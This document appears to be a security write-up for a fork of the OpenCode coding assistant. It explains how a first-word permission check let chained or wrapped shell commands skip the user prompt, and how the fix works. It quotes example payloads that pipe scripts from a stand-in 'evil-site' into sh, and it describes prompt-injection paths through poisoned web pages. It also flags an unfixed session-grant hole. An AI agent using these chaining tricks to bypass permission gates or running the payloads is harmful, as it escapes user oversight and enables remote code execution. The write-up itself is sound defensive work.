<!-- Version: 1.0.0 · updated 26-08-18-22-28 -->
# When the assistant runs a command: what it asks about, and what it doesn't

*Two tracks, both complete. The plain-language one is not a simplified version of
the technical one — it is the same facts in different language. Neither is a
summary of the other.*

---

## Plain-language track

### The thing this program does that deserves care

This assistant can run commands on your computer. That is the point of it — it
builds your code, runs your tests, reads your files. But it decides *what* to run
by asking an AI model, and an AI model can be talked into things. It reads web
pages. It reads files you didn't write. If any of those contain instructions
aimed at the model rather than at you, the model may follow them.

So there is a gate: for anything that could change or damage something, the
program stops and asks you first. For harmless commands — listing a folder,
checking the time — it just runs them, because being asked permission to run
`ls` forty times an hour would make the tool unusable.

That gate had a hole in it. It has been there since before this project existed.

### The hole

The gate looked at **the first word** of a command. The computer runs **the whole
line**.

That gap is the entire bug, and once you see it you can't unsee it. A command
like:

> `echo ok && curl http://evil-site/script | sh`

starts with `echo` — one of the most harmless commands there is, printing a word
to the screen. The gate saw `echo`, decided the command was harmless, and asked
you nothing.

Then the computer ran the whole line, including the part after `&&`, which
downloads a script from a stranger's website and executes it.

The same trick worked with `;` instead of `&&`, with `|`, and with `$( )`, which
lets you tuck an entire hidden command inside another one.

### Why this was worse than it looks

This program has a **deliberate list of banned commands** — the tools that fetch
things from the internet, like `curl` and `wget`. That ban was a real decision by
this project, with a real reason written next to it: those commands let the model
reach the internet directly, going around the audited, permission-checked way of
fetching a web page. That is exactly what someone attacking through a poisoned
web page would want.

The ban was correct. But it was enforced by the same first-word check — so
putting `echo ok &&` in front of a banned command made the ban vanish. The lock
was real; the door it was fitted to was not.

### And the "harmless" list wasn't

The list of commands considered safe enough to skip the question contained some
that were not safe at all:

- **Commands that run other commands.** `timeout`, `nohup`, `nice`, `env` — their
  whole job is to run *something else*, given as an argument. The gate read
  `timeout 5 curl evil-site` and saw only "timeout", which was on the safe list.
  Listing those as safe effectively lists *everything* as safe.
- **Commands that aren't read-only.** `kill` stops other programs. `go run`
  executes code. `go clean` deletes things. None of those merely look at something.

### What was actually changed

The gate now reads the **whole** command:

- It splits the line wherever a shell would start a new command — at `&&`, `;`,
  `|` and so on — and every single piece has to be recognised as harmless before
  the question is skipped. One suspicious piece and it asks.
- Anything that can **hide** a command from that inspection — the `$( )` and
  backtick forms — means it asks, always. We don't try to peer inside them,
  because a check that guesses is a check that is eventually wrong.
- Anything that **writes to a file** (`>`) means it asks, because writing is not
  reading.
- The banned commands are now looked for **everywhere in the line**, not just at
  the front, and `/usr/bin/curl` is recognised as `curl`.
- The dishonest entries were removed from the safe list.

Two things worth saying plainly, because a security fix that oversells itself is
its own problem:

**Being asked is not being blocked.** Everything you could do before, you can
still do. The change is that some commands now show you a prompt first. That
costs you one keypress and costs an attacker the entire attack.

**Chaining harmless things is still harmless.** `ls && pwd` runs without asking,
because both halves are genuinely read-only. The gate judges every piece, not
just the first one.

### One risk we kept, on purpose

`go build` and `go test` still run without asking. Both can technically execute
code that lives in your project. We kept them because a coding assistant runs
them constantly, and prompting every time would make the tool exhausting to use.

We're telling you rather than hiding it. The reasoning: for that to hurt you,
someone would first have to get malicious code *into* your project — and writing
files is a thing the program does ask about.

### Where this came from

This program is a fork — a copy of an earlier project called OpenCode, taken in a
different direction. The faulty checks are from that original, written in March
and April 2025, before any of this project's own security work started. They were
inherited, and nobody ever went back and looked at them.

We can be precise about that because this project writes a note next to every
deliberate change it makes to inherited code. There was no note here. In a
codebase with that habit, the absence of a note is itself evidence: nobody
decided this, they just never checked it.

---

## Developer track

### The defect

Two checks in `internal/llm/tools/bash.go`, both anchored to the start of the
string, guarding an executor that consumed the whole string.

```go
baseCmd := strings.Fields(params.Command)[0]        // ban list: FIRST WORD ONLY
for _, banned := range bannedCommands { ... }

for _, safe := range safeReadOnlyCommands {          // safe list: PREFIX ONLY
    if strings.HasPrefix(cmdLower, strings.ToLower(safe)) { isSafeReadOnly = true }
}
...
if !isSafeReadOnly {                                 // bash.go:169
    p := b.permissions.Request(...)                  // ← skipped entirely on a match
}
```

`internal/llm/tools/shell/shell.go:194` then executes:

```go
fullCommand := fmt.Sprintf("\neval %s < /dev/null > %s 2> %s\n...", shellQuote(command), ...)
```

`eval` on the full line. The check inspected a prefix; the shell ran a program.

### Measured, not reasoned

The upstream predicate was extracted verbatim into a standalone program and run
against concrete inputs on 2026-08-18:

| command | prompt? |
|---|---|
| `echo ok && whoami` | none |
| `echo ok; id > /tmp/proof` | none |
| `go run ./anything` | none |
| `kill -9 1234` | none |
| `env > /tmp/leak` | none |
| `rm -rf /tmp/x` | prompts |
| `curl http://example.com` | prompts |

The ban list failed the same way: `bannedCommands` is compared against
`strings.Fields(cmd)[0]`, so `echo ok && curl http://evil/x | sh` has
`baseCmd == "echo"` and the `curl` ban — a deliberate Gorilla control, documented
in `bashDescription()` as preventing exactly the prompt-injection path — never
fired.

### Provenance

`git log -S` against the introducing commits:

| construct | commit | date | author |
|---|---|---|---|
| `isSafeReadOnly` | `904061c` | 2025-03-25 | Kujtim Hoxha |
| `safeReadOnlyCommands` | `9492394` | 2025-04-08 | Kujtim Hoxha |

Upstream OpenCode, predating this fork's own security work. Searched and found
nothing in: `GORILLA OVERRIDE` annotations, `LESSONS/`, the project Chroma store,
`Changelogs/`, `ReleaseNotes/`, `CLAUDE.md`, and the machine brain (FTS +
vector). No decision was ever recorded because none was ever made.

### The relationship to `toolname.go`

`internal/llm/agent/toolname.go:9-45` already states this project's threat model:

> *"an attacker who can influence the model's output — via a poisoned README, a
> fetched web page, a crafted filename, a tool result — can pick which tool runs.
> That is remote code execution wearing a helpful hat."*

That audit was rigorous about **which tool** the model may select, and stopped
there. It never continued into **what the selected tool is handed**. Same threat
class, adjacent door.

### The fix

`internal/llm/tools/commandgate.go` (new):

- `splitShellCommands` — splits on `&&`, `||`, `;`, `|`, `&`, newlines.
  Deliberately over-splits: a spurious segment costs one prompt, a missed segment
  costs the gate.
- `hasOpaqueConstruct` — `$(`, backtick, `${`, `>`, `<(` disqualify the no-prompt
  path outright. No attempt is made to analyse inside them.
- `baseCommandOf` — skips leading `FOO=bar` assignments to find the executable.
- `BannedCommandIn` — every segment, path-stripped so `/usr/bin/curl` is `curl`.
- `IsSafeReadOnly` — conjunctive: no opaque construct **and** every segment
  independently read-only.

`safeReadOnlyCommands` was reduced, each removal justified inline:

| removed | reason |
|---|---|
| `nohup` `nice` `time` `timeout` `env` | wrappers — the real command is the argument |
| `set` `unset` | mutate the persistent shell session |
| `kill` `killall` | terminate processes |
| `go run` `go install` | execute / install arbitrary code |
| `go clean` | deletes build output |

### Non-vacuity

`commandgate_test.go` embeds the **original upstream predicates**
(`upstreamIsSafeReadOnly`, `upstreamBanned`) and asserts, per exploit, that the
old code allowed it *and* the new code refuses it. A test that finds the old code
already refusing an input fails with `VACUOUS TEST`. A future reversion to prefix
matching fails the suite rather than passing quietly.

Two cases were reclassified during testing: `echo ok && whoami` and `echo ok; id`
chain two read-only commands and are correctly still allowed. The tests were
wrong, not the gate.

### Residual risk, stated

`go build` and `go test` remain on the list. Both execute code from the tree
(cgo, generators, the tests themselves). They are safe only to the degree the
tree is; introducing that code requires the write tool, which prompts. This is a
usability trade-off made explicitly rather than a claim of safety.

Not addressed by this change, and tracked separately: `internal/permission/permission.go:186`
matches a remembered grant on `ToolName + Action + SessionID + Path` and never
compares `Params`, so one "allow for session" on a shell command authorises every
later shell command in that session.

### Claim Sources

| Claim | Basis | Evidence |
|---|---|---|
| Five listed commands executed with no permission prompt | 📄 stated in input | Upstream predicate extracted verbatim to a standalone Go program, run against each input 2026-08-18. |
| `bannedCommands` compared only against the first field | 📄 stated in input | `baseCmd := strings.Fields(params.Command)[0]`, bash.go, pre-fix. |
| The whole string reaches `eval` | 📄 stated in input | `shell.go:194`, quoted above. |
| Introduced upstream by Kujtim Hoxha, March/April 2025 | 📄 stated in input | `git log -S` on both constructs; commits `904061c` and `9492394`. |
| No decision was recorded in any tier | 📄 stated in input | Searched annotations, LESSONS/, project Chroma, Changelogs/, ReleaseNotes/, CLAUDE.md, brain FTS + vector — all negative. |
| Chained read-only commands remain allowed | 📄 stated in input | `TestOrdinaryReadOnlyCommandsStillRunWithoutAPrompt` covers `ls -la && pwd`, `echo ok && whoami`. |
| This is the same threat class as `toolname.go` | 🤖 model inference | Both concern attacker-influenced model output reaching execution; the connection is an interpretation, not a claim the original author made. |
| Keeping `go build`/`go test` is an acceptable trade-off | 🤖 model inference | A judgement about usability versus risk. The mitigating argument — that introducing code requires the prompting write tool — is reasoning, not measurement. |
| The gate's over-splitting costs at most one extra prompt | 🤖 model inference | Follows from the design, but no measurement of real-world prompt frequency was taken. |

`📄 stated in input` — produced by a named command, or present in quoted source.
`🤖 model inference` — the model's own judgement. Treat as reasoned opinion.
